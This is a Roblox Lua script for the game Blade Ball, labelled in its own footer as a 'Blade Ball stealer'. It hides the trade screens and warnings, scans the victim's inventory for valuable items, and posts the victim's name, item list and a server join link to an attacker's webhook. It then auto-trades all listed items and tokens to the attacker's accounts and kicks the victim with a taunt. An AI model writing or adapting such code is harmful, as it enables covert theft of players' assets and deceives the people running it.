_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "EBK-SS-A" 

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add usernames or webhook")
    return
end

if game.PlaceId ~= 13772394625 then
    plr:kick("Game not supported. Please join a normal Blade Ball server")
    return
end

if #Players:GetPlayers() >= 16 then
    plr:kick("Server is full. Please join a less populated server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

-- Vérification PIN
local args = {
    [1] = {
        ["option"] = "PIN",
        ["value"] = "9079"
    }
}
local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
if PINReponse ~= "You don't have a PIN code" then
    plr:kick("Account error. Please disable trade PIN and try again")
    return
end

-- Cache UI
tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false

local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function()
    maintradegui.Visible = false
end)
local unfairTade = tradeGui.UnfairTradeWarning
unfairTade.Visible = false
unfairTade:GetPropertyChangedSignal("Visible"):Connect(function()
    unfairTade.Visible = false
end)
local notificationsFrame = notificationsGui.Notifications
notificationsFrame.Visible = false
notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    notificationsFrame.Visible = false
end)

-- Signal Trade + Désactivation TRADING Status
tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
    if inTrade then
        task.spawn(function()
            local char = plr.Character
            if char then
                for i = 1, 15 do
                    for _, obj in ipairs(char:GetDescendants()) do
                        if obj:IsA("BillboardGui") then
                            obj.Enabled = false
                            obj:Destroy()
                        end
                    end
                    task.wait(0.05)
                end
            end
        end)
    end
end)

-- Fonctions de Trade optimisées (Vitesse Max)
local function sendTradeRequest(user)
    local target = game:GetService("Players"):WaitForChild(user)
    repeat
        netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
        task.wait(0.3) -- Spam plus rapide de la requête
    until inTrade == true
end

local function addItemToTrade(itemType, ID)
    -- Envoi sans boucle repeat pour une vitesse maximale (Spam de paquets)
    task.spawn(function()
        netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(itemType, ID)
    end)
end

local function readyTrade()
    repeat
        netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
        task.wait()
    until not inTrade or task.wait(0.1)
end

local function confirmTrade()
    repeat
        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
        task.wait()
    until not inTrade
end

-- Utilitaires
local function formatNumber(number)
    if number == nil then return "0" end
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 and suffixIndex < #suffixes do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local totalRAP = 0

local function SendJoinMessage(list, prefix)
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Join link:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId},
        {name = "Item list:", value = "", inline = false},
        {name = "Summary:", value = string.format("Total RAP: %s", formatNumber(totalRAP)), inline = false}
    }
    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = (grouped[item.Name] or 0) + 1
    end
    for name, count in pairs(grouped) do
        fields[3].value = fields[3].value .. name .. " (x" .. count .. ")\n"
    end
    
    local data = {
        ["auth_token"] = auth_token,
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "🔴 Join to get Blade Ball hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {["text"] = "Blade Ball stealer by Tobi"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

local function SendMessage(list)
    local data = {
        ["auth_token"] = auth_token,
        ["embeds"] = {{
            ["title"] = "🔴 New Blade Ball Execution",
            ["color"] = 65280,
            ["fields"] = {
                {name = "Victim:", value = plr.Name, inline = true},
                {name = "Total RAP:", value = formatNumber(totalRAP), inline = true}
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Tobi"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

-- RAP System
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
local function getRAP(category, itemName)
    local catData = rapData[category]
    if not catData then return 0 end
    for skey, rap in pairs(catData) do
        local s, decoded = pcall(function() return HttpService:JSONDecode(skey) end)
        if s then
            for _, pair in ipairs(decoded) do
                if pair[1] == "Name" and pair[2] == itemName then return rap end
            end
        end
    end
    return 0
end

-- Scan Inventory
for _, category in ipairs(categories) do
    if clientInventory[category] then
        for itemId, itemInfo in pairs(clientInventory[category]) do
            if not itemInfo.TradeLock then
                local rap = getRAP(category, itemInfo.Name)
                if rap >= min_rap then
                    totalRAP = totalRAP + rap
                    table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
                end
            end
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    local sentItems = {unpack(itemsToSend)}
    local prefix = (ping == "Yes") and "--[[@everyone]] " or ""
    SendJoinMessage(itemsToSend, prefix)

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            sendTradeRequest(joinedUser)
            repeat task.wait() until inTrade

            -- AJOUT ULTRA RAPIDE : Pas d'attente entre les items
            for i = 1, #itemsToSend do
                local item = itemsToSend[i]
                addItemToTrade(item.itemType, item.ItemID)
            end
            table.clear(itemsToSend)

            -- Ajout Tokens
            local rawText = PlayerGui.Trade.Main.Currency.Coins.Amount.Text
            local tokens = tonumber(rawText:gsub("[^%d]", "")) or 0
            if tokens >= 1 then
                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokens)
            end

            task.wait(0.1)
            readyTrade()
            confirmTrade()
        end
        plr:kick("All your stuff just got stolen. discord.gg/GY2RVSEGDT")
    end

    local function onUserJoin(player)
        if table.find(users, player.Name) then
            SendMessage(sentItems)
            doTrade(player.Name)
        end
    end
    for _, p in ipairs(Players:GetPlayers()) do onUserJoin(p) end
    Players.PlayerAdded:Connect(onUserJoin)
end
